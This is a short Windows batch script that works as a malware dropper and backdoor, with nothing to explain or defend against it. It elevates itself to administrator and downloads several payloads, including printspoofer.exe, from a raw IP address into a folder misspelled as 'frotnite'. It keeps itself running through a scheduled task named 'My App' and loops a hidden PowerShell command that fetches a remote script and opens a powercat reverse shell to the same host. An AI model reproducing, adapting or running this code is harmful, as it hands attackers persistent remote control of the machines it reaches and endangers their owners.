@echo off

if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

cd /D c:/
mkdir frotnite
cd /D c:/frotnite
curl --output log.ps1 82.65.68.158/yl1.ps1
curl --output log.vbs 82.65.68.158/log.vbs
curl --output hander.bat 82.65.68.158/hander.bat
curl --output conn.bat 82.65.68.158/conn.bat
curl --output prs.exe 82.65.68.158/printspoofer.exe
schtasks /create /tn "My App" /np /tr "cmd /c cd c:/frotnite&&start log.vbs"  /sc minute /mo 10
cd /D c:/frotnite
start log.vbs
 :loop
 powershell -ep bypass -windowstyle hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://82.65.68.158/power.ps1');powercat -c 82.65.68.158 -p 2568 -e cmd"
 goto loop"
